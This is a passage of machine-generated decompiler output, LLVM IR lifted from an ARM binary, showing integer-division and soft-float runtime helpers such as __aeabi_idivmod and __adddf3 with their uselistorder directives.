  br i1 %v3_1daa0, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1da9c
  %v0_1daac70 = phi i32 [ %v1_1daa0, %dec_label_pc_1da9c ], [ %v4_1daa0, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1dab0 = phi i32 [ %v0_1daac70, %.thread19 ], [ %v4_1daa0, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1daac = icmp ugt i32 %v1_1dab0, 255
  br i1 %v2_1daac, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1dab0 = and i32 %v1_1dab0, 128
  %v3_1dab0 = icmp eq i32 %v2_1dab0, 0
  %v4_1dab0 = udiv i32 %v1_1dab0, 256
  br i1 %v3_1dab0, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1dab4 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1dac0 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1dab4, %bb108 ]
  %v1_1dabc = phi i32 [ %v1_1dab0, %bb106 ], [ %v4_1dab0, %bb107 ], [ %v4_1dab0, %bb108 ]
  %v2_1dab8 = icmp ugt i32 %v1_1dabc, 15
  br i1 %v2_1dab8, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1dabc = and i32 %v1_1dabc, 8
  %v3_1dabc = icmp eq i32 %v2_1dabc, 0
  %v4_1dabc = udiv i32 %v1_1dabc, 16
  br i1 %v3_1dabc, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1dac0 = add nsw i32 %v1_1dac0, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1dac8 = phi i32 [ %v1_1dac0, %.thread20 ], [ %v1_1dac0, %bb109 ], [ %v2_1dac0, %bb110 ]
  %v5_1dacc = phi i32 [ %v1_1dabc, %.thread20 ], [ %v4_1dabc, %bb109 ], [ %v4_1dabc, %bb110 ]
  %v2_1dac4 = icmp ugt i32 %v5_1dacc, 3
  %v7_1dac4 = icmp eq i32 %v5_1dacc, 4
  %v2_1dac8 = xor i1 %v7_1dac4, true
  %v3_1dac8 = and i1 %v2_1dac4, %v2_1dac8
  br i1 %v3_1dac8, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1dac8 = add nsw i32 %v4_1dac8, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1dacc = phi i32 [ %v4_1dac8, %.thread21 ], [ %v5_1dac8, %bb111 ]
  %v2_1dacc = xor i1 %v2_1dac4, true
  %v3_1dacc = or i1 %v7_1dac4, %v2_1dacc
  br i1 %v3_1dacc, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1dacc = udiv i32 %v5_1dacc, 2
  %v9_1dacc = add i32 %v4_1dacc, %v8_1dacc
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1dad4 = phi i32 [ %v4_1dacc, %bb112 ], [ %v9_1dacc, %bb113 ]
  %v1_1dad0 = icmp slt i32 %v2_1d9cc, 0
  %v6_1dad4 = lshr i32 %v0_1dad4, %v1_1dad4
  %v2_1dad8 = sub i32 0, %v6_1dad4
  %v2_1dad8.v6_1dad4 = select i1 %v1_1dad0, i32 %v2_1dad8, i32 %v6_1dad4
  ret i32 %v2_1dad8.v6_1dad4

dec_label_pc_1dae0:                               ; preds = %entry
  %v0_1dae4 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1dacc, { 1, 0 }
  uselistorder i1 %v7_1dac4, { 1, 0 }
  uselistorder i32 %v4_1dabc, { 1, 0 }
  uselistorder i32 %v1_1dabc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1dab0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1dab0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1daa0, { 1, 0 }
  uselistorder i32 %v0_1da64, { 1, 0 }
  uselistorder i32 %v4_1da58, { 1, 0 }
  uselistorder i32 %v1_1da60, { 1, 2, 0 }
  uselistorder i32 %v4_1da4c, { 1, 0 }
  uselistorder i32 %v1_1da54, { 1, 2, 0 }
  uselistorder i32 %v4_1da40, { 1, 0 }
  uselistorder i32 %v1_1da48, { 1, 2, 0 }
  uselistorder i32 %v1_1da6c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1da3c, { 1, 0 }
  uselistorder i32 %v1_1da68, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1da28, { 1, 0 }
  uselistorder i32 %v3_1da24, { 1, 0 }
  uselistorder i32 %v1_1da24, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1da20, { 1, 0 }
  uselistorder i32 %v1_1da28, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1da14, { 1, 0 }
  uselistorder i32 %v4_1da10, { 2, 1, 0 }
  uselistorder i32 %v1_1da14, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1da1c.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1d9e8, { 1, 0 }
  uselistorder i32 %v1_1daa0, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1d9cc, { 1, 0, 2 }
  uselistorder i32 %v0_1d9c8, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1da74, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1da30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1da1cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1daf8 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1daf8
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_1db10 = bitcast i64 %tmp to double
  %v9_1db10 = fadd double %v8_1db10, %arg1
  %v10_1db10 = fptrunc double %v9_1db10 to float
  %v11_1db10 = bitcast float %v10_1db10 to i32
  ret i32 %v11_1db10
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1db14 = load i32, i32* @r0, align 4
  ret i32 %v2_1db14
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1db18 = load i32, i32* @r4, align 4
  store i32 %v3_1db18, i32* %stack_var_-12, align 4
  %v6_1db18 = load i32, i32* @r5, align 4
  %v9_1db18 = load i32, i32* @lr, align 4
  %v0_1db1c = load i32, i32* %r1.global-to-local, align 4
  %v2_1db1c = mul i32 %v0_1db1c, 2
  store i32 %v2_1db1c, i32* %r4.global-to-local, align 4
  %v0_1db20 = load i32, i32* %r3.global-to-local, align 4
  %v2_1db20 = mul i32 %v0_1db20, 2
  store i32 %v2_1db20, i32* %r5.global-to-local, align 4
  %v4_1db24 = icmp eq i32 %v2_1db20, %v2_1db1c
  %v1_1db28 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_1db24, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1db28 = load i32, i32* %r2.global-to-local, align 4
  %v5_1db28 = icmp eq i32 %v2_1db28, %v1_1db28
  br i1 %v5_1db28, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_1db2c = or i32 %v1_1db28, %v2_1db1c
  %v5_1db2c = icmp eq i32 %v3_1db2c, 0
  br i1 %v5_1db2c, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_1db30 = load i32, i32* %r2.global-to-local, align 4
  %v3_1db30 = or i32 %v2_1db30, %v2_1db20
  %v5_1db30 = icmp eq i32 %v3_1db30, 0
  br i1 %v5_1db30, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_1db1c.off = add i32 %v2_1db1c, 4194303
  %tmp = icmp ult i32 %v2_1db1c.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_1db20.off = add i32 %v2_1db20, 4194303
  %tmp17 = icmp ult i32 %v2_1db20.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_1db3c = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1db3c, i32 ptrtoint (i32* @global_var_1dd74.1235 to i32))
  %v0_1db40 = load i32, i32* %r4.global-to-local, align 4
  %v3_1db40 = udiv i32 %v0_1db40, 2097152
  store i32 %v3_1db40, i32* %r4.global-to-local, align 4
  %v1_1db44 = load i32, i32* %r5.global-to-local, align 4
  %v4_1db44 = udiv i32 %v1_1db44, 2097152
  %v5_1db44 = sub nsw i32 %v4_1db44, %v3_1db40
  %v5_1db48 = icmp ult i32 %v4_1db44, %v3_1db40
  br i1 %v5_1db48, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_1db48 = sub nsw i32 0, %v5_1db44
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_1db48, %bb13 ], [ %v5_1db44, %.thread3 ]
  %v0_1db6c = phi i32 [ %v7_1db48, %bb13 ], [ %v5_1db44, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1db4c = icmp ugt i32 %v4_1db44, %v3_1db40
  br i1 %v7_1db4c, label %dec_label_pc_1db50, label %dec_label_pc_1db6c

dec_label_pc_1db50:                               ; preds = %bb14
  %v2_1db50 = add nsw i32 %v0_1db6c, %v3_1db40
  store i32 %v2_1db50, i32* %r4.global-to-local, align 4
  %v0_1db54 = load i32, i32* %r0.global-to-local, align 4
  %v1_1db54 = load i32, i32* %r2.global-to-local, align 4
  %v0_1db58 = load i32, i32* %r1.global-to-local, align 4
  %v1_1db58 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1db54, i32* %r0.global-to-local, align 4
  store i32 %v1_1db58, i32* %r1.global-to-local, align 4
  store i32 %v0_1db54, i32* %r2.global-to-local, align 4
  store i32 %v0_1db58, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1db6c

dec_label_pc_1db6c:                               ; preds = %bb14, %dec_label_pc_1db50
  %tmp18 = icmp ugt i32 %v0_1db6c, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1db6c
  %v6_1db70 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1db70, i32* %r4.global-to-local, align 4
  store i32 %v6_1db18, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1db6c, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_1db18)
  %v0_1db78 = load i32, i32* %r1.global-to-local, align 4
  %v3_1db78 = icmp sgt i32 %v0_1db78, -1
  %v4_1db84 = urem i32 %v0_1db78, 1048576
  %v5_1db84 = or i32 %v4_1db84, 1048576
  store i32 %v5_1db84, i32* %r1.global-to-local, align 4
  br i1 %v3_1db78, label %dec_label_pc_1db94, label %dec_label_pc_1db8c

dec_label_pc_1db8c:                               ; preds = %bb16
  %v0_1db8c = load i32, i32* %r0.global-to-local, align 4
  %v1_1db8c = sub i32 0, %v0_1db8c
  store i32 %v1_1db8c, i32* %r0.global-to-local, align 4
  %v2_1db8c = icmp eq i32 %v0_1db8c, 0
  %v2_1db90 = icmp eq i1 %v2_1db8c, false
  %v5_1db90 = sext i1 %v2_1db90 to i32
  %v6_1db90 = sub nsw i32 %v5_1db90, %v5_1db84
  store i32 %v6_1db90, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1db94

dec_label_pc_1db94:                               ; preds = %bb16, %dec_label_pc_1db8c
  %v0_1db94 = load i32, i32* %r3.global-to-local, align 4
  %v3_1db94 = icmp sgt i32 %v0_1db94, -1
  %v4_1db9c = urem i32 %v0_1db94, 1048576
  %v5_1db9c = or i32 %v4_1db9c, 1048576
  store i32 %v5_1db9c, i32* %r3.global-to-local, align 4
  br i1 %v3_1db94, label %dec_label_pc_1dbac, label %dec_label_pc_1dba4

dec_label_pc_1dba4:                               ; preds = %dec_label_pc_1db94
  %v0_1dba4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1dba4 = sub i32 0, %v0_1dba4
  store i32 %v1_1dba4, i32* %r2.global-to-local, align 4
  %v2_1dba4 = icmp eq i32 %v0_1dba4, 0
  %v2_1dba8 = icmp eq i1 %v2_1dba4, false
  %v5_1dba8 = sext i1 %v2_1dba8 to i32
  %v6_1dba8 = sub nsw i32 %v5_1dba8, %v5_1db9c
  store i32 %v6_1dba8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1dbac

dec_label_pc_1dbac:                               ; preds = %dec_label_pc_1db94, %dec_label_pc_1dba4
  %v0_1dbac = load i32, i32* %r4.global-to-local, align 4
  %v1_1dbac = load i32, i32* %r5.global-to-local, align 4
  %v4_1dbac = icmp eq i32 %v1_1dbac, %v0_1dbac
  call void @__pseudo_cond_branch(i1 %v4_1dbac, i32 ptrtoint (i32* @global_var_1dd5c.1236 to i32))
  %v1_1dbb0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1dbb0

; uselistorder directives
  uselistorder i32 %v0_1db94, { 1, 0 }
  uselistorder i32 %v0_1db78, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_1db44, { 2, 1, 0 }
  uselistorder i32 %v3_1db40, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1db28, { 1, 0 }
  uselistorder i32 %v2_1db20, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1db1c, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_1dbac, { 1, 0 }
  uselistorder label %dec_label_pc_1db94, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_1db6c, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1dbb4() local_unnamed_addr {
dec_label_pc_1dbb4:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1dbb4 = load i32, i32* @r4, align 4
  %v1_1dbb4 = add i32 %v0_1dbb4, -1
  store i32 %v1_1dbb4, i32* @r4, align 4
  %v0_1dbb8 = load i32, i32* @r5, align 4
  %v1_1dbb8 = sub i32 32, %v0_1dbb8
  store i32 %v1_1dbb8, i32* @lr, align 4
  %v5_1dbbc = icmp sgt i32 %v0_1dbb8, 32
  br i1 %v5_1dbbc, label %dec_label_pc_1dbd8, label %dec_label_pc_1dbc0

dec_label_pc_1dbc0:                               ; preds = %dec_label_pc_1dbb4
  %v0_1dbc0 = load i32, i32* @r2, align 4
  %v6_1dbc0 = shl i32 %v0_1dbc0, %v1_1dbb8
  store i32 %v6_1dbc0, i32* %ip.global-to-local, align 4
  %v0_1dbc4 = load i32, i32* @r0, align 4
  %v3_1dbc4 = add i32 %v0_1dbb8, -1
  %v4_1dbc4 = shl i32 1, %v3_1dbc4
  %v7_1dbc4 = lshr i32 %v0_1dbc0, %v0_1dbb8
  %v8_1dbc4 = add i32 %v0_1dbc4, %v7_1dbc4
  %v9_1dbc4 = icmp ult i32 %v8_1dbc4, %v0_1dbc4
  %v0_1dbc8 = load i32, i32* @r1, align 4
  %v2_1dbc8 = zext i1 %v9_1dbc4 to i32
  %v3_1dbc8 = add i32 %v2_1dbc8, %v0_1dbc8
  %v1_1dbcc = load i32, i32* @r3, align 4
  %v7_1dbcc = shl i32 %v1_1dbcc, %v1_1dbb8
  %v8_1dbcc = add i32 %v7_1dbcc, %v8_1dbc4
  store i32 %v8_1dbcc, i32* %r0.global-to-local, align 4
  %v5_1dbd0 = and i32 %v1_1dbcc, %v4_1dbc4
  %v6_1dbd0 = icmp ne i32 %v5_1dbd0, 0
  %v7_1dbd0 = ashr i32 %v1_1dbcc, %v0_1dbb8
  %v9_1dbd0 = add i32 %v3_1dbc8, %v7_1dbd0
  %v10_1dbd0 = zext i1 %v6_1dbd0 to i32
  %v11_1dbd0 = add i32 %v10_1dbd0, %v9_1dbd0
  br label %dec_label_pc_1dbf4

dec_label_pc_1dbd8:                               ; preds = %dec_label_pc_1dbb4
  %v1_1dbd8 = add i32 %v0_1dbb8, -32
  %v1_1dbdc = add i32 %v1_1dbb8, 32
  store i32 %v1_1dbdc, i32* @lr, align 4
  %v0_1dbe4 = load i32, i32* @r3, align 4
  %v2_1dbe4 = add i32 %v1_1dbb8, 31
  %v3_1dbe4 = lshr i32 -2147483648, %v2_1dbe4
  %v4_1dbe4 = and i32 %v0_1dbe4, %v3_1dbe4
  %v5_1dbe4 = icmp ne i32 %v4_1dbe4, 0
  %v6_1dbe4 = shl i32 %v0_1dbe4, %v1_1dbdc
  %v2_1dbe8 = or i32 %v6_1dbe4, 2
  %v2_1dbe8.v6_1dbe4 = select i1 %v5_1dbe4, i32 %v2_1dbe8, i32 %v6_1dbe4
  store i32 %v2_1dbe8.v6_1dbe4, i32* %ip.global-to-local, align 4
  %v0_1dbec = load i32, i32* @r0, align 4
  %v7_1dbec = ashr i32 %v0_1dbe4, %v1_1dbd8
  %v8_1dbec = add i32 %v0_1dbec, %v7_1dbec
  store i32 %v8_1dbec, i32* %r0.global-to-local, align 4
  %v0_1dbf0 = load i32, i32* @r1, align 4
  %v2_1dbf0 = and i32 %v0_1dbe4, 1073741824
  %v3_1dbf0 = icmp ne i32 %v2_1dbf0, 0
  %v4_1dbf0 = ashr i32 %v0_1dbe4, 31
  %v6_1dbf0 = add i32 %v0_1dbf0, %v4_1dbf0
  %v7_1dbf0 = zext i1 %v3_1dbf0 to i32
  %v8_1dbf0 = add i32 %v6_1dbf0, %v7_1dbf0
  br label %dec_label_pc_1dbf4

dec_label_pc_1dbf4:                               ; preds = %dec_label_pc_1dbc0, %dec_label_pc_1dbd8
  %storemerge = phi i32 [ %v11_1dbd0, %dec_label_pc_1dbc0 ], [ %v8_1dbf0, %dec_label_pc_1dbd8 ]
  %v0_1dbf4 = phi i32 [ %v11_1dbd0, %dec_label_pc_1dbc0 ], [ %v8_1dbf0, %dec_label_pc_1dbd8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_1dbf4 = and i32 %v0_1dbf4, -2147483648
  store i32 %v1_1dbf4, i32* @r5, align 4
  %v1_1dbf8 = icmp sgt i32 %v0_1dbf4, -1
  call void @__pseudo_cond_branch(i1 %v1_1dbf8, i32 ptrtoint (i32* @global_var_1dc08.1237 to i32))
  %v0_1dbfc = load i32, i32* %ip.global-to-local, align 4
  %v1_1dbfc = sub i32 0, %v0_1dbfc
  store i32 %v1_1dbfc, i32* %ip.global-to-local, align 4
  %v2_1dbfc = icmp eq i32 %v0_1dbfc, 0
  %v0_1dc00 = load i32, i32* %r0.global-to-local, align 4
  %v2_1dc00 = icmp eq i1 %v2_1dbfc, false
  %v5_1dc00 = sext i1 %v2_1dc00 to i32
  %v6_1dc00 = sub i32 %v5_1dc00, %v0_1dc00
  store i32 %v6_1dc00, i32* %r0.global-to-local, align 4
  %v7_1dc00 = zext i1 %v2_1dc00 to i32
  %v8_1dc00 = icmp ne i32 %v6_1dc00, %v7_1dc00
  %v9_1dc00 = icmp ne i32 %v0_1dc00, -1
  %v10_1dc00 = or i1 %v9_1dc00, %v8_1dc00
  %v11_1dc00 = icmp ne i32 %v0_1dc00, 0
  %v12_1dc00 = select i1 %v2_1dc00, i1 %v10_1dc00, i1 %v11_1dc00
  %v0_1dc04 = load i32, i32* %r1.global-to-local, align 4
  %v5_1dc04 = sext i1 %v12_1dc00 to i32
  %v6_1dc04 = sub i32 %v5_1dc04, %v0_1dc04
  store i32 %v6_1dc04, i32* @r1, align 4
  ret i32 %v6_1dc00

; uselistorder directives
  uselistorder i1 %v2_1dc00, { 1, 2, 0 }
  uselistorder i32 %v0_1dc00, { 1, 2, 0 }
  uselistorder i32 %v8_1dbf0, { 1, 0 }
  uselistorder i32 %v0_1dbe4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_1dbd0, { 1, 0 }
  uselistorder i32 %v1_1dbcc, { 1, 0, 2 }
  uselistorder i32 %v0_1dbc4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1dbf4, { 1, 0 }
}

define i32 @function_1dc08(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1dc08:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1dc08 = load i32, i32* %r1.global-to-local, align 4
  %v3_1dc0c = icmp ult i32 %v0_1dc08, 1048574
  br i1 %v3_1dc0c, label %dec_label_pc_1dc50, label %dec_label_pc_1dc10

dec_label_pc_1dc10:                               ; preds = %dec_label_pc_1dc08
  %v3_1dc14 = icmp ult i32 %v0_1dc08, 2097150
  br i1 %v3_1dc14, label %dec_label_pc_1dc34, label %dec_label_pc_1dc18

dec_label_pc_1dc18:                               ; preds = %dec_label_pc_1dc10
  %v1_1dc18 = urem i32 %v0_1dc08, 2
  %v2_1dc18 = icmp ne i32 %v1_1dc18, 0
  %v3_1dc18 = udiv i32 %v0_1dc08, 2
  store i32 %v3_1dc18, i32* %r1.global-to-local, align 4
  %v0_1dc1c = load i32, i32* %r0.global-to-local, align 4
  %v3_1dc1c = zext i1 %v2_1dc18 to i32
  %v6_1dc1c = zext i32 %v0_1dc1c to i64
  %v7_1dc1c = sub i32 33, %v0_1dc1c
  %v8_1dc1c = zext i32 %v7_1dc1c to i64
  %v9_1dc1c = shl i64 %v6_1dc1c, %v8_1dc1c
  %v10_1dc1c = sub i32 32, %v0_1dc1c
  %v11_1dc1c = shl i32 %v3_1dc1c, %v10_1dc1c
  %v12_1dc1c = zext i32 %v11_1dc1c to i64
  %v14_1dc1c = or i64 %v12_1dc1c, %v9_1dc1c
  %v15_1dc1c = trunc i64 %v14_1dc1c to i32
  %v16_1dc1c = add i32 %v0_1dc1c, -1
  %v17_1dc1c = shl i32 1, %v16_1dc1c
  %v18_1dc1c = and i32 %v17_1dc1c, %v0_1dc1c
  %v19_1dc1c = icmp ne i32 %v18_1dc1c, 0
  store i32 %v15_1dc1c, i32* %r0.global-to-local, align 4
  %v0_1dc20 = load i32, i32* @ip, align 4
  %v3_1dc20 = zext i1 %v19_1dc1c to i32
  %v6_1dc20 = zext i32 %v0_1dc20 to i64
  %v7_1dc20 = sub i32 33, %v0_1dc20
  %v8_1dc20 = zext i32 %v7_1dc20 to i64
  %v9_1dc20 = shl i64 %v6_1dc20, %v8_1dc20
  %v10_1dc20 = sub i32 32, %v0_1dc20
  %v11_1dc20 = shl i32 %v3_1dc20, %v10_1dc20
  %v12_1dc20 = zext i32 %v11_1dc20 to i64
  %v14_1dc20 = or i64 %v12_1dc20, %v9_1dc20
  %v15_1dc20 = trunc i64 %v14_1dc20 to i32
  store i32 %v15_1dc20, i32* @ip, align 4
  %v0_1dc24 = load i32, i32* @r4, align 4
  %v1_1dc24 = add i32 %v0_1dc24, 1
  store i32 %v1_1dc24, i32* @r4, align 4
  %v3_1dc28 = mul i32 %v1_1dc24, 2097152
  %v2_1dc2c = icmp ugt i32 %v3_1dc28, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1dc2c, i32 ptrtoint (i32* @global_var_1dde4.1238 to i32))
  br label %dec_label_pc_1dc34

dec_label_pc_1dc34:                               ; preds = %dec_label_pc_1dc50, %dec_label_pc_1dc10, %dec_label_pc_1dc18
  %v0_1dc34 = load i32, i32* @ip, align 4
  %v2_1dc34 = icmp slt i32 %v0_1dc34, 0
  %v6_1dc34 = icmp eq i32 %v0_1dc34, -2147483648
  %v1_1dc38 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1dc34, label %bb, label %dec_label_pc_1dc34._crit_edge

bb:                                               ; preds = %dec_label_pc_1dc34
  %v2_1dc38 = urem i32 %v1_1dc38, 2
  %v3_1dc38 = icmp ne i32 %v2_1dc38, 0
  br label %dec_label_pc_1dc34._crit_edge

dec_label_pc_1dc34._crit_edge:                    ; preds = %dec_label_pc_1dc34, %bb
  %v1_1dc3c = phi i1 [ %v3_1dc38, %bb ], [ %v2_1dc34, %dec_label_pc_1dc34 ]
  %v2_1dc3c = zext i1 %v1_1dc3c to i32
  %v3_1dc3c = add i32 %v2_1dc3c, %v1_1dc38
  store i32 %v3_1dc3c, i32* %r0.global-to-local, align 4
  %v0_1dc40 = load i32, i32* %r1.global-to-local, align 4
  %v1_1dc40 = load i32, i32* @r4, align 4
  %v2_1dc40 = and i32 %v1_1dc40, 4096
  %v3_1dc40 = icmp ne i32 %v2_1dc40, 0
  %v4_1dc40 = mul i32 %v1_1dc40, 1048576
  %v6_1dc40 = add i32 %v4_1dc40, %v0_1dc40
  %v7_1dc40 = zext i1 %v3_1dc40 to i32
  %v8_1dc40 = add i32 %v7_1dc40, %v6_1dc40
  %v1_1dc44 = load i32, i32* @r5, align 4
  %v2_1dc44 = or i32 %v1_1dc44, %v8_1dc40
  store i32 %v2_1dc44, i32* %r1.global-to-local, align 4
  ret i32 %v3_1dc3c

dec_label_pc_1dc50:                               ; preds = %dec_label_pc_1dc08
  %v0_1dc50 = load i32, i32* @ip, align 4
  %v1_1dc50 = icmp slt i32 %v0_1dc50, 0
  %v2_1dc50 = mul i32 %v0_1dc50, 2
  store i32 %v2_1dc50, i32* @ip, align 4
  %v0_1dc54 = load i32, i32* %r0.global-to-local, align 4
  %v3_1dc54 = mul i32 %v0_1dc54, 2
  %v4_1dc54 = zext i1 %v1_1dc50 to i32
  %v5_1dc54 = or i32 %v3_1dc54, %v4_1dc54
  store i32 %v5_1dc54, i32* %r0.global-to-local, align 4
  %v9_1dc54 = icmp ule i32 %v5_1dc54, %v0_1dc54
  %v10_1dc54 = icmp ult i32 %v3_1dc54, %v0_1dc54
  %v11_1dc54 = select i1 %v1_1dc50, i1 %v9_1dc54, i1 %v10_1dc54
  %v3_1dc58 = mul i32 %v0_1dc08, 2
  %v4_1dc58 = zext i1 %v11_1dc54 to i32
  %v5_1dc58 = or i32 %v4_1dc58, %v3_1dc58
  store i32 %v5_1dc58, i32* %r1.global-to-local, align 4
  %v1_1dc5c = and i32 %v3_1dc58, 1048576
  %v2_1dc5c = icmp eq i32 %v1_1dc5c, 0
  %v0_1dc60 = load i32, i32* @r4, align 4
  %v1_1dc60 = add i32 %v0_1dc60, -1
  store i32 %v1_1dc60, i32* @r4, align 4
  br i1 %v2_1dc5c, label %bb7, label %dec_label_pc_1dc34

bb7:                                              ; preds = %dec_label_pc_1dc50
  ret i32 %v5_1dc54

; uselistorder directives
  uselistorder i32 %v0_1dc54, { 1, 2, 0 }
  uselistorder i1 %v1_1dc50, { 1, 0 }
  uselistorder i32 %v1_1dc38, { 1, 0 }
  uselistorder i32 %v0_1dc34, { 1, 0 }
  uselistorder i32 %v0_1dc20, { 1, 0, 2 }
  uselistorder i32 %v0_1dc1c, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
